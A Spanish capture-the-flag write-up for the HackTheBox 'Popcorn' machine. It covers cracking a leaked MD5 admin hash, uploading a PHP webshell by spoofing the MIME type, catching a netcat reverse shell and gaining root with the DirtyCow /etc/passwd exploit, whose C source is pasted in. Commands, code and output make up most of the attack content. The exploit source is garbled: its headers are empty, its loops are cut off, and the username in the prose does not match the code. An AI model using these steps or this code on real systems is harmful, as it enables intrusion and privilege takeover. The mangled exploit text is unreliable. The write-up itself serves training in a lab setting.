# Popcorn

![](../../../../~gitbook/image.md)Publicado: 26 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Popcorn es una máquina Linux de dificultad media de HackTheBox que presenta una aplicación web vulnerable llamada "Torrent Hoster". La explotación inicial se logra mediante la subida de archivos maliciosos aprovechando una validación débil del tipo MIME en la funcionalidad de actualización de capturas de pantalla de torrents. Una vez obtenido el acceso inicial, la escalada de privilegios se realiza explotando la vulnerabilidad DirtyCow (CVE-2016-5195) presente en el kernel Linux 2.6.31, permitiendo modificar el archivo `/etc/passwd` para crear un usuario con privilegios de root.
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####80 HTTP
Al acceder a http://popcorn.htb encontramos únicamente el siguiente mensaje:🕷️Fuzzing de directoriosAl realizar fuzzing de directorios con ferxobuster y dirsearch encontramos algunos recursos que podrían ser interesante analizar:Los siguientes recursos muestran al acceder el contenido del fichero info.php de la aplicación.http://popcorn.htb/test
http://popcorn.htb/test/version_tmp
http://popcorn.htb/test/test.php
http://popcorn.htb/test/tmp/
http://popcorn.htb/test/reports![](../../../../~gitbook/image.md)El siguiente recurso corresponde a una web donde se aloja un servicio para la subida de archivos de torrent. Además tiene una opción para el registro de usuarios, la cual utilizamos.http://popcorn.htb/torrent/![](../../../../~gitbook/image.md)Al acceder al siguiente recurso obtenemos el siguiente error:
http://popcorn.htb/torrent/admin/http://popcorn.htb/torrent/database/th_database.sql
Aquí encontramos nada menos que un dump de la base de datos:Al final de archivo, encontramos lo que parece ser el hash en MD5 de una cuenta de administrador. Usamos hashcat y el diccionario rockyou y logramos obtener la contraseña:
###💻 Explotación
Buscando información sobre el servicio Torrent Hoster descubrimos que ha habido ciertas vulnerabilidades para este servicio:[Unauthenticated RCE ]https://raw.githubusercontent.com/Anon-Exploiter/exploits/refs/heads/master/torrent_hoster_unauthenticated_rce.pyComo ya nos habíamos registrado con una cuenta en la aplicación, decidimos acceder a
popcorn.htb/torrents.php?mode=upload y verificar si el módulo de subida de archivos es vulnerable. Después de algún tiempo tratando de hacer que el exploit funcionara, lo descarté como un posible rabbit hole.Sin embargo, el exploit menciona que la funcionalidad que permita la subida de una screenshot para la imagen del torrent es vulnerable, para ello, debemos subir una imagen de torrent legítima y una vez subida, vamos a Browse y hacemos click en editar este torrent y se abrirá una nueva ventana la cual nos permitirá seleccionar la opción Update Screenshot![](../../../../~gitbook/image.md)En este punto, iniciamos Burpsuite para inceptar la petición y poder subir una webshell en php que nos permita explotar nuestro RCE.Una vez interceptada la petición de la subida de nuestra php webshell, modificamos el content-type por una de las permitidas:![](../../../../~gitbook/image.md)Reemplazamos el MIME type application/x-php por image/gif y deberemos recibir un mensaje de que la shell se ha subido correctamente:Ahora iniciamos nuestro listener con netcat y podemos obtener la url del archivo situándonos sobre el icono de la imagen y copiando la URL:http://popcorn.htb/torrent/upload/3c87fab96998fc4da551128ee6215060b756c178.phpY obtendremos la RCE:
####Mejora del tratamiento de la TTY

####Initial Foothold
Enumeramos los usuarios de la máquina y encontramos un usuario llamado `george` en cuyo directorio está la primera flag:
####🗝️ Escalada de privilegios
Buscamos la forma de escalar como usuario george y verificamos puertos y servicios en ejecución:Hay una base de datos mysql que no está expuesta, probamos a autenticarnos sin éxito con la credencial del usuario Admin que habíamos obtenido anteriormente.Seguimos enumerando la máquina y encontramos algo interesante:Nos conectamos a la base de datos y hacemos un dump de la tabla de usuarios:Vemos que el hash del usuario Admin es otro diferente, por lo que el dump que habíamos encontrado puede que no fuese reciente.Intentamos crackear este hash MD5 usando hashcat y el diccionario rockyou pero pronto comprobamos que no es crackeable y parece otro rabbit hole.Optamos por otra vía y enumeramos la versión del kernel del sistema y vemos que se trata de una versión muy antigua.Una simple búsqueda de esta versión del kernel nos arroja un posible exploit para la escalada de privilegios
####🔓 CVE-2016-5195
https://www.exploit-db.com/exploits/40839Este exploit abusa de la vulnerabilidad dirtycow para añadir una nueva línea al fichero /etc/passwd sin especificar el parámetro x para que no vaya a buscar la contraseña al /etc/shadow y ejecutar la sesión como usuario root.Copiamos el exploit en el directorio /tmp de la máquina y lo guardamos como exploit.c y lo compilamos tal como indica:A continuación listamos el archivo /etc/passwd y veremos que hay una nueva línea para un usuario llamado `rorefart`![](../../../../~gitbook/image.md)Ahora simplemente debemos autenticarnos como rorefart y la contraseña que habíamos puesto y ya somos root:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.10.6
PING 10.10.10.6 (10.10.10.6) 56(84) bytes of data.
64 bytes from 10.10.10.6: icmp_seq=1 ttl=63 time=47.2 ms
64 bytes from 10.10.10.6: icmp_seq=2 ttl=63 time=47.8 ms

--- 10.10.10.6 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 47.162/47.504/47.846/0.342 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.6 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.10.6 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 18:03 CEST
Nmap scan report for 10.10.10.6
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds

```

```
echo "10.10.10.6 popcorn.htb" | sudo tee -a /etc/hosts
```

```
# It works!

This is the default web page for this server.

The web server software is running but no content has been added, yet.
```

```
feroxbuster -u http://popcorn.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
http://popcorn.htb/
http://popcorn.htb/torrent/
http://popcorn.htb/torrent/images/
http://popcorn.htb/torrent/templates/
http://popcorn.htb/torrent/templates/email/
http://popcorn.htb/torrent/users/
http://popcorn.htb/torrent/admin/
http://popcorn.htb/torrent/health/
http://popcorn.htb/torrent/admin/images/
http://popcorn.htb/torrent/admin/templates/
http://popcorn.htb/torrent/css/
http://popcorn.htb/torrent/lib/
http://popcorn.htb/torrent/database/
```

```
dirsearch -u http://popcorn.htb -x 503
```

```
[18:13:30] 200 -   177B - /index
[18:13:30] 200 -   177B - /index.html
[18:13:39] 200 -   48KB - /test
[18:13:39] 200 -   48KB - /test/version_tmp/
[18:13:39] 200 -   48KB - /test.php
[18:13:39] 200 -   48KB - /test/tmp/
[18:13:39] 200 -   48KB - /test/
[18:13:39] 200 -   48KB - /test/reports
```

```
You do not have permission to access this file
**Fatal error**: Cannot break/continue 1 level in **/var/www/torrent/admin/index.php** on line **10**
```

```
-- phpMyAdmin SQL Dump
-- version 2.10.1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jun 03, 2007 at 09:00 PM
-- Server version: 5.0.41
-- PHP Version: 4.4.7

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- Database: `torrenthoster`
--

--
-- Dumping data for table `users`
--

INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');
```

```
hashcat -m 0 admin_hash /usr/share/wordlists/rockyou.txt
```

```

1844156d4166d94387f1a4ad031ca5fa:admin12

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1844156d4166d94387f1a4ad031ca5fa
Time.Started.....: Mon May 26 18:27:58 2025 (0 secs)
Time.Estimated...: Mon May 26 18:27:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9099.7 kH/s (0.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 442368/14344385 (3.08%)
Rejected.........: 0/442368 (0.00%)
Restore.Point....: 434176/14344385 (3.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: apoapo -> 55555d
Hardware.Mon.#1..: Util: 19%

Started: Mon May 26 18:27:57 2025
Stopped: Mon May 26 18:28:00 2025
```

```
if (($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/jpg")
|| ($_FILES["file"]["type"] == "image/png")
```

```
Upload: shell.php
Type: image/gif
Size: 5.3623046875 Kb
Upload Completed.
Please refresh to see the new screenshot.
```

```
nc -nlvp 443
```

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.6] 47761
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
20:00:28 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$
```

```
script /dev/null -c bash

CRTL + Z
(Suspended)

stty raw -echo; fg
reset xterm
export TERM=xterm

stty rows 37 columns 127
```

```
www-data@popcorn:/$ cd /home
www-data@popcorn:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Mar 17  2017 .
drwxr-xr-x 21 root   root   4096 May 26 19:01 ..
drwxr-xr-x  3 george george 4096 Oct 26  2023 george
www-data@popcorn:/home$ cd george
www-data@popcorn:/home/george$ ls -la
total 860
drwxr-xr-x 3 george george   4096 Oct 26  2023 .
drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..
lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 May 26 19:01 user.txt
www-data@popcorn:/home/george$ cat user.txt

```

```
www-data@popcorn:/tmp/torrenthoster/torrenthoster$ /sbin/ss -tulnp
Netid  Recv-Q Send-Q          Local Address:Port            Peer Address:Port
tcp    0      50                  127.0.0.1:3306                       *:*
tcp    0      128                        :::80                        :::*
tcp    0      128                        :::22                        :::*
tcp    0      128                         *:22
```

```
www-data@popcorn:/var/www/torrent$ cat config.php
dirroot     = dirname(__FILE__);

//Edit This For TORRENT HOSTER Database
//database configuration
$CFG->host = "localhost";
$CFG->dbName = "torrenthoster";	//db name
$CFG->dbUserName = "torrent";    //db username
$CFG->dbPassword = "SuperSecret!!";	//db password

$dbhost 	= $CFG->host;
$dbuser 	= $CFG->dbUserName;
$dbpass 	= $CFG->dbPassword;
$database 	= $CFG->dbName;
```

```
www-data@popcorn:/var/www/torrent$ mysql -u torrent -h localhost -p
Enter password: SuperSecret!!
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 90
Server version: 5.1.37-1ubuntu5.5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| torrenthoster      |
+--------------------+
2 rows in set (0.00 sec)

mysql> use torrenthoster;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------+
| Tables_in_torrenthoster |
+-------------------------+
| ban                     |
| categories              |
| comments                |
| log                     |
| namemap                 |
| news                    |
| subcategories           |
| users                   |
+-------------------------+
8 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
| id | userName | password                         | privilege | email                | joined              | lastconnect         |
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
|  3 | Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | admin     | admin@yourdomain.com | 2007-01-06 21:12:46 | 2007-01-06 21:12:46 |
|  5 | test     | 098f6bcd4621d373cade4e832627b4f6 | user      | test@test.es         | 2025-05-26 19:20:29 | 2025-05-26 19:20:29 |
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

```
www-data@popcorn:/tmp$ uname -a
Linux popcorn 2.6.3114-generic-pae #48-Ubuntu SMP
```

```
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
char *username;
char *hash;
int user_id;
int group_id;
char *info;
char *home_dir;
char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
int size = snprintf(NULL, 0, format, u.username, u.hash,
u.user_id, u.group_id, u.info, u.home_dir, u.shell);
char *ret = malloc(size + 1);
sprintf(ret, format, u.username, u.hash, u.user_id,
u.group_id, u.info, u.home_dir, u.shell);
return ret;
}

void *madviseThread(void *arg) {
int i, c = 0;
for(i = 0; i = 2) {
plaintext_pw = argv[1];
printf("Please enter the new password: %s\n", plaintext_pw);
} else {
plaintext_pw = getpass("Please enter the new password: ");
}

user.hash = generate_password_hash(plaintext_pw);
char *complete_passwd_line = generate_passwd_line(user);
printf("Complete line:\n%s\n", complete_passwd_line);

f = open(filename, O_RDONLY);
fstat(f, &st);
map = mmap(NULL,
st.st_size + sizeof(long),
PROT_READ,
MAP_PRIVATE,
f,
0);
printf("mmap: %lx\n",(unsigned long)map);
pid = fork();
if(pid) {
waitpid(pid, NULL, 0);
int u, i, o, c = 0;
int l=strlen(complete_passwd_line);
for(i = 0; i
```
gcc -pthread exploit.c -o dirty -lcrypt
```

```
chmod +x dirty
./dirty

#Ponemos una contraseña cualquiera
```

```
su rorefart
id
cat /root/root.txt
```
